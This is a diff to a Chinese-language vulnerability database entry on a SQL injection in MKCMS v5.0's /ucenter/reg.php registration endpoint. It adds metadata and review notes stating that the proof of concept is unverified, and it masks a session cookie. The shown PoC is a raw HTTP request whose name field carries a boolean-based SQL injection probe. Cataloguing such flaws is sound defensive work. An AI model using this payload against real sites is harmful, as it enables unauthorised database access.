@@ -1,6 +1,36 @@
 ---
 source: "hatch 补库批 20260928"
+product: "MKCMS5.0"
+record_type: "unknown"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+identifier_status: "unknown"
+title: "MKCMS v5.0 _ucenter_reg.php前台注入漏洞"
+prerequisites: "来源所述条件，未列明部分仍待核：公开注册端点/旧mysql扩展"
+side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
+source_status: "unknown"
+id: "vw-b470a607e5a14a7da4558602"
+entity_id: "ve-b470a607e5a14a7da4558602"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：公开注册端点/旧mysql扩展
+
+- **事实待核（1）**：与242KCMS5.0同文同请求同来源，此处产品MKCMS与表名前缀一致，242疑漏M。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。
+
+- **证据待核（2）**：本篇少管理员结果截图，合并时择全资源；同样Content-Length52与更长正文不匹配、缺真假对照。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 # MKCMS v5.0 /ucenter/reg.php前台sql注入漏洞
 
@@ -48,7 +78,7 @@ POC：
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 52
     Connection: close
-    Cookie: PHPSESSID=cb8e6ccde6cf9050972fa9461d606be3
+    Cookie: PHPSESSID=cb8**************************be3
     Upgrade-Insecure-Requests: 1
 
     name=test' AND 1=1 AND 'inject'='inject&email=sss%40qq.com&password=ssssss&submit=
